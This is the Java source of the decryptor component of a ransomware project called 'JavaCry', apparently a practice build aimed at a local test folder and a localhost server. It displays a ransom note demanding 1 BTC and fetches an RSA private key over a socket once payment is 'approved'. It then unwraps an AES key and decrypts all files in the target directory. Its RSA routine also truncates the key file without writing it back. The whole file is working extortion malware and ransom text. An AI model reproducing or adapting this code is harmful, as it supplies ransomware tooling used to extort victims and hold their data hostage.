import java.awt.*;
import javax.swing.*;
import java.awt.event.*;

import java.util.*;
import java.net.*;
import java.io.*;
import java.io.FileOutputStream;
import java.util.stream.Collectors;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.spec.IvParameterSpec;
import java.util.Base64;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.stream.Stream;

import java.security.*;
import java.security.InvalidKeyException;
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import java.security.spec.PKCS8EncodedKeySpec;


/*
   decryptor:
   BTC payment interface
   Request for decryption functionality
   if receives the key, use the key to decrypt the files
   destroy decryptor.java
 */

class Decryptor {
private static int id = 802131503;
private Socket socket;
private String address;
private int port;
private DataOutputStream out     = null;
private DataInputStream in     = null;
private String b64privkey;
private PrivateKey private_key;
private static java.util.List<Path> files = new ArrayList<Path>();
private static String targetPath = "/Users/daniel/Desktop/java_practice/JavaCry/Test_Env";
private Cipher RSA_Cipher;
private Cipher AES_Cipher;

public Decryptor() {
        address = "127.0.0.1";
        port = 5555;

        String note = String.join("\n"
                                  , "<html>"
                                  , ""
                                  , "<h1>Your files have been encrypted.</h1>"
                                  , "<p>"
                                  , "Your files have been encrypted. If you want to decrypt your files, please copy the content of sendtome.txt send it with $1 BTC to address. You can generate the transaction output with <address>https://btcmessage.com/</address>, and copy it to your BTC wallet to send me your money. I will check the payments before I approve your request for decryption."
                                  , "</p>"
                                  , "<p>"
                                  , "<br><b>Don’t delete or modify any content in Key_protected.key, or you will lose your ability to decrypt your files.</b>"
                                  , "</p>"
                                  , "<p>"
                                  , "<br>If you want to open this window again, please run Decryptor.jar.<br>"
                                  , "</p>"
                                  , "</html>"
                                  );
        JFrame f = new JFrame();
        JPanel panel = new JPanel(new FlowLayout());
        JLabel html = new JLabel(note, JLabel.LEFT);

        // creating a Button
        JButton b = new JButton("Request for Decryption");
        JLabel status = new JLabel("");
        b.addActionListener(new ActionListener() {

                        @Override
                        public void actionPerformed(ActionEvent e) {
                          try
                          {
                              status.setText("Trying to connect");
                              socket = new Socket(address, port);
                              status.setText("Waiting for approval");

                              // sends output to the socket
                              in = new DataInputStream(socket.getInputStream());
                              out = new DataOutputStream(socket.getOutputStream());

                              out.writeUTF(String.valueOf(id));
                              b64privkey = in.readUTF();
                              System.out.println(b64privkey);
                              if (b64privkey.equals("but I refuse")) {
                                status.setText("Your request has been rejected");
                                return;
                              }
                              byte[] pub = Base64.getDecoder().decode(b64privkey);
                              PKCS8EncodedKeySpec spec = new PKCS8EncodedKeySpec(pub);
                              KeyFactory factory = KeyFactory.getInstance("RSA");
                              private_key = factory.generatePrivate(spec);
                              status.setText("You are approved, decrypting files");

                              RSA_Cipher = Cipher.getInstance("RSA");
                              AES_Cipher = Cipher.getInstance("AES");
                              try (Stream<Path> paths = Files.walk(Paths.get(targetPath))) {
                                      files = paths.filter(Files::isRegularFile).collect(Collectors.toList());
                              }
                              catch (Exception err) {
                                      ;
                              }
                              try {
                                decryptFiles();
                                status.setText("You're files have been decrypted successfully");
                              }
                              catch (Exception err) {
                                status.setText("Decryption failed");
                              }





                          }
                          catch(UnknownHostException u)
                          {
                              System.out.println(u);
                          }
                          catch(IOException i)
                          {
                              System.out.println(i);
                              status.setText("Connection failed");
                          } catch (Exception err) {
                            System.out.println(err);
                          }
                        }
                });


        // setting position of above components in the frame
        b.setBounds(100, 200, 200, 30);
        status.setBounds(100, 300, 400, 30);
        panel.setLayout(new FlowLayout());

        // adding components into frame
        f.add(b);
        f.add(status);

        panel.add(html);
        f.getContentPane().add(panel);

        // frame size 300 width and 300 height
        f.setSize(1200,600);

        // setting the title of frame
        f.setTitle("JavaCry Decryptor");
        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        // setting visibility of frame
        f.setVisible(true);
}

public byte[] RSACrypt(File f) {
  try {
    FileInputStream in = new FileInputStream(f);
    byte[] input = new byte[(int) f.length()];
    in.read(input);

    FileOutputStream out = new FileOutputStream(f);
    byte[] output = RSA_Cipher.doFinal(input);

    return output;
  } catch (Exception e) {
    System.out.println(e);
  }
  return null;
}

public void AESCrypt(File f) {
  try {
    FileInputStream in = new FileInputStream(f);
    byte[] input = new byte[(int) f.length()];
    in.read(input);

    FileOutputStream out = new FileOutputStream(f);
    byte[] output = AES_Cipher.doFinal(input);
    out.write(output);

    out.flush();
    out.close();
    in.close();
    System.out.println("Decrypting file: " + f);
  } catch (Exception e) {
    System.out.println(e);
  }
}

public void decryptFiles() throws Exception {

  RSA_Cipher.init(Cipher.DECRYPT_MODE, private_key);
  File k = new File("Key_protected.key");
  byte[] data = RSACrypt(k);
  SecretKey AESKey = new SecretKeySpec(data, 0, data.length, "AES");
  AES_Cipher.init(Cipher.DECRYPT_MODE, AESKey);
  for (Path p : files) {
          try {
                  File f = p.toFile();
                  AESCrypt(f);
          } catch (Exception e) {
                  System.out.println(e);
          }
  }

}

// main method
public static void main(String args[]) {

// creating instance of Frame class
        Decryptor awt_obj = new Decryptor();
}

}
